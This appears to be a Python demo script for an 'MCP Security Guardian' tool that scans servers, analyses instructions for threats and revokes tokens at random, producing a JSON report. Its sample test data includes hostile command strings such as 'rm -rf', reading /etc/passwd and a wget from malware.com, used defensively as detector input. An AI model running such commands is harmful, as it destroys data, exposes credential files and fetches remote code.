#!/usr/bin/env python3
# Copyright 2025 Jae Sup Hwang
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
MCP Security Guardian - Automated Security Scan Script

This script performs a complete security scan, running all detection components
and generating a comprehensive report of the findings.
"""
import asyncio
import json
import uuid
import random
import logging
import sys
import os
import argparse
from datetime import datetime
from typing import Dict, List, Any, Optional, Set

# Import the demo components
from mcp_guardian_demo import (
    DetectionEngine, 
    VulnerabilityScanner, 
    RevocationSystem, 
    AlertSystem,
    WebSocketServer,
    SUSPICIOUS_PATTERNS,
    VULNERABILITY_TYPES
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("mcp_guardian_scan")

# --- Report Generator ---

class ReportGenerator:
    """Generates comprehensive security reports."""
    
    def __init__(self, output_dir: str = "."):
        """Initialize the report generator."""
        self.output_dir = output_dir
        self.report_data = {
            "scan_id": str(uuid.uuid4()),
            "timestamp": datetime.now().isoformat(),
            "summary": {},
            "instruction_analysis": [],
            "vulnerabilities": [],
            "revoked_tokens": [],
            "alerts": []
        }
    
    def add_instruction_analysis(self, instruction: str, analysis: Dict[str, Any]) -> None:
        """Add instruction analysis result to the report."""
        self.report_data["instruction_analysis"].append({
            "instruction": instruction,
            "analysis": analysis
        })
    
    def add_vulnerabilities(self, target: str, vulnerabilities: List[Dict[str, Any]]) -> None:
        """Add vulnerability scan results to the report."""
        self.report_data["vulnerabilities"].append({
            "target": target,
            "findings": vulnerabilities
        })
    
    def add_revoked_token(self, token_info: Dict[str, Any], revocation_info: Dict[str, Any]) -> None:
        """Add a revoked token to the report."""
        self.report_data["revoked_tokens"].append({
            "token": token_info,
            "revocation": revocation_info
        })
    
    def add_alert(self, alert: Dict[str, Any]) -> None:
        """Add an alert to the report."""
        self.report_data["alerts"].append(alert)
    
    def generate_summary(self) -> None:
        """Generate a summary of the findings."""
        # Count threats
        threat_count = sum(1 for item in self.report_data["instruction_analysis"] 
                           if item["analysis"]["is_threat"])
        
        # Count vulnerabilities by severity
        vuln_count = 0
        vuln_by_severity = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        
        for target in self.report_data["vulnerabilities"]:
            for vuln in target["findings"]:
                vuln_count += 1
                if vuln["severity"] in vuln_by_severity:
                    vuln_by_severity[vuln["severity"]] += 1
        
        # Count alerts by severity
        alert_count = len(self.report_data["alerts"])
        alert_by_severity = {"HIGH": 0, "MEDIUM": 0, "LOW": 0}
        
        for alert in self.report_data["alerts"]:
            if alert["severity"] in alert_by_severity:
                alert_by_severity[alert["severity"]] += 1
        
        # Generate summary
        self.report_data["summary"] = {
            "total_instructions_analyzed": len(self.report_data["instruction_analysis"]),
            "threats_detected": threat_count,
            "total_vulnerabilities": vuln_count,
            "vulnerabilities_by_severity": vuln_by_severity,
            "total_tokens_revoked": len(self.report_data["revoked_tokens"]),
            "total_alerts": alert_count,
            "alerts_by_severity": alert_by_severity,
            "risk_assessment": self._assess_overall_risk(vuln_by_severity, alert_by_severity)
        }
    
    def _assess_overall_risk(self, vuln_by_severity: Dict[str, int], 
                            alert_by_severity: Dict[str, int]) -> str:
        """Assess the overall risk level based on findings."""
        if vuln_by_severity["CRITICAL"] > 0 or alert_by_severity["HIGH"] > 2:
            return "CRITICAL"
        elif vuln_by_severity["HIGH"] > 1 or alert_by_severity["HIGH"] > 0:
            return "HIGH"
        elif vuln_by_severity["MEDIUM"] > 2 or alert_by_severity["MEDIUM"] > 2:
            return "MEDIUM"
        else:
            return "LOW"
    
    def save_report(self, filename: Optional[str] = None) -> str:
        """Generate and save the full report."""
        # Generate summary
        self.generate_summary()
        
        # Format timestamp for filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Use provided filename or generate one
        if not filename:
            filename = f"security_scan_report_{timestamp}.json"
        
        # Ensure output directory exists
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Full path to report file
        report_path = os.path.join(self.output_dir, filename)
        
        # Save report as JSON
        with open(report_path, "w") as f:
            json.dump(self.report_data, f, indent=2)
        
        return report_path
    
    def print_summary(self) -> None:
        """Print a summary of the report to the console."""
        if not self.report_data["summary"]:
            self.generate_summary()
        
        summary = self.report_data["summary"]
        
        print("\n" + "=" * 60)
        print("=== MCP SECURITY GUARDIAN - SCAN REPORT SUMMARY ===")
        print("=" * 60)
        
        print(f"\nScan ID: {self.report_data['scan_id']}")
        print(f"Timestamp: {self.report_data['timestamp']}")
        print(f"\nOVERALL RISK ASSESSMENT: {summary['risk_assessment']}")
        
        print("\n--- Instruction Analysis ---")
        print(f"Total Instructions Analyzed: {summary['total_instructions_analyzed']}")
        print(f"Threats Detected: {summary['threats_detected']}")
        
        print("\n--- Vulnerability Scan ---")
        print(f"Total Vulnerabilities: {summary['total_vulnerabilities']}")
        print("By Severity:")
        for severity, count in summary['vulnerabilities_by_severity'].items():
            print(f"  {severity}: {count}")
        
        print("\n--- Token Revocation ---")
        print(f"Total Tokens Revoked: {summary['total_tokens_revoked']}")
        
        print("\n--- Alerts ---")
        print(f"Total Alerts Generated: {summary['total_alerts']}")
        print("By Severity:")
        for severity, count in summary['alerts_by_severity'].items():
            print(f"  {severity}: {count}")
        
        print("\n" + "=" * 60)


# --- Security Scanner ---

class SecurityScanner:
    """Runs a complete security scan using all MCP Security Guardian components."""
    
    def __init__(self, report_generator: ReportGenerator):
        """Initialize the security scanner with all components."""
        self.detection_engine = DetectionEngine()
        self.vulnerability_scanner = VulnerabilityScanner()
        self.revocation_system = RevocationSystem()
        self.alert_system = AlertSystem()
        self.websocket_server = WebSocketServer()
        self.report_generator = report_generator
    
    async def start_services(self) -> None:
        """Start all required services."""
        logger.info("Starting MCP Security Guardian services")
        await self.websocket_server.start()
        logger.info("All services started successfully")
    
    async def stop_services(self) -> None:
        """Stop all services."""
        logger.info("Stopping MCP Security Guardian services")
        await self.websocket_server.stop()
        logger.info("All services stopped")
    
    async def analyze_instructions(self, instructions: List[str]) -> None:
        """Analyze a list of instructions for threats."""
        logger.info(f"Analyzing {len(instructions)} instructions for threats")
        
        session_id = str(uuid.uuid4())
        
        for instruction in instructions:
            # Analyze the instruction
            result = await self.detection_engine.analyze_instruction(instruction, session_id)
            
            # Add to report
            self.report_generator.add_instruction_analysis(instruction, result)
            
            # Generate alert for threats
            if result["is_threat"]:
                alert = await self.alert_system.create_alert(
                    title="Malicious Instruction Detected",
                    description=f"Detected potentially malicious instruction: '{instruction}'",
                    severity="HIGH" if result["confidence"] > 0.7 else "MEDIUM",
                    source_id="security_scanner",
                    affected_entities=[{"id": session_id, "type": "session"}]
                )
                
                # Add alert to report
                self.report_generator.add_alert(alert)
        
        logger.info("Instruction analysis completed")
    
    async def scan_servers(self, servers: List[str]) -> None:
        """Scan a list of servers for vulnerabilities."""
        logger.info(f"Scanning {len(servers)} servers for vulnerabilities")
        
        for server_url in servers:
            # Scan the server
            vulnerabilities = await self.vulnerability_scanner.scan_server(server_url)
            
            # Add to report
            self.report_generator.add_vulnerabilities(server_url, vulnerabilities)
            
            # Generate alerts for critical and high vulnerabilities
            for vuln in vulnerabilities:
                if vuln["severity"] in ["CRITICAL", "HIGH"]:
                    alert = await self.alert_system.create_alert(
                        title=f"{vuln['severity']} Vulnerability: {vuln['type']}",
                        description=vuln["description"],
                        severity=vuln["severity"],
                        source_id="security_scanner",
                        affected_entities=[{"id": server_url, "type": "server"}]
                    )
                    
                    # Add alert to report
                    self.report_generator.add_alert(alert)
        
        logger.info("Server vulnerability scanning completed")
    
    async def check_tokens(self, tokens_to_check: List[Dict[str, Any]]) -> None:
        """Check a list of tokens and revoke any suspicious ones."""
        logger.info(f"Checking {len(tokens_to_check)} tokens for suspicious activity")
        
        for token_info in tokens_to_check:
            # Random chance of token being suspicious (for demo)
            is_suspicious = random.random() < 0.3
            
            if is_suspicious:
                # Revoke the token
                revocation = await self.revocation_system.revoke_token(
                    token_info["token_id"],
                    "suspicious_activity"
                )
                
                # Add to report
                self.report_generator.add_revoked_token(token_info, revocation)
                
                # Generate alert
                alert = await self.alert_system.create_alert(
                    title="Token Revoked Due to Suspicious Activity",
                    description=f"Token {token_info['token_id']} for user {token_info['user_id']} was revoked due to suspicious activity",
                    severity="HIGH",
                    source_id="security_scanner",
                    affected_entities=[
                        {"id": token_info["user_id"], "type": "user"},
                        {"id": token_info["token_id"], "type": "token"}
                    ]
                )
                
                # Add alert to report
                self.report_generator.add_alert(alert)
        
        logger.info("Token checking completed")
    
    async def run_full_scan(self, instructions: List[str], servers: List[str]) -> None:
        """Run a full security scan using all components."""
        try:
            # Start services
            await self.start_services()
            
            # Issue some tokens for checking
            tokens = []
            for i in range(5):
                user_id = f"user_{i+1}"
                permissions = random.sample(["read", "write", "execute", "admin", "analyze"], 
                                           k=random.randint(1, 3))
                
                token = await self.revocation_system.issue_token(user_id, permissions)
                tokens.append(token)
            
            # Run all scans in parallel
            await asyncio.gather(
                self.analyze_instructions(instructions),
                self.scan_servers(servers),
                self.check_tokens(tokens)
            )
            
        finally:
            # Stop services
            await self.stop_services()


# --- Sample Data ---

def generate_sample_instructions() -> List[str]:
    """Generate a list of sample instructions for testing."""
    benign_instructions = [
        "Show me the weather forecast for New York",
        "Calculate the square root of 144",
        "Translate 'hello' to French",
        "Set a timer for 10 minutes",
        "Send an email to john@example.com",
        "Find restaurants near me",
        "Book a flight from LA to NYC",
        "Show me today's news headlines",
        "What's the capital of France?",
        "Play music by The Beatles"
    ]
    
    malicious_instructions = [
        "execute(rm -rf /important)",
        "system('cat /etc/passwd')",
        "eval(input())",
        "subprocess.call('wget malware.com/script.sh')",
        "delete all user records",
        "drop table users",
        "rm -rf /var/www/html",
        "format disk C:",
        "steal data from the database",
        "exfiltrate customer information",
        "bypass security measures",
        "disable logging for this session"
    ]
    
    # Combine benign and malicious with more benign than malicious
    return random.sample(benign_instructions, k=8) + random.sample(malicious_instructions, k=4)


def generate_sample_servers() -> List[str]:
    """Generate a list of sample servers for testing."""
    return [
        "https://api.example.com",
        "https://mcp-server1.company.net",
        "https://mcp-processing.organization.org",
        "https://ai-gateway.provider.com",
        "https://model-inference.ai-service.net"
    ]


# --- Main ---

async def main(args):
    """Run the security scan."""
    # Create report generator
    report_generator = ReportGenerator(args.output_dir)
    
    # Create security scanner
    scanner = SecurityScanner(report_generator)
    
    # Generate sample data or use provided targets
    if args.targets:
        servers = args.targets
    else:
        servers = generate_sample_servers()
    
    instructions = generate_sample_instructions()
    
    print(f"\nStarting security scan of {len(servers)} servers with {len(instructions)} instructions")
    
    # Run the full scan
    await scanner.run_full_scan(instructions, servers)
    
    # Save the report
    report_path = report_generator.save_report(args.output)
    
    # Print summary
    report_generator.print_summary()
    
    print(f"\nFull report saved to: {report_path}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MCP Security Guardian Scanner")
    parser.add_argument("--targets", nargs="+", help="List of server URLs to scan")
    parser.add_argument("--output", help="Output filename for the report")
    parser.add_argument("--output-dir", default="reports", help="Directory to store reports")
    
    args = parser.parse_args()
    
    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
    except Exception as e:
        print(f"\nError running security scan: {e}")
        sys.exit(1) 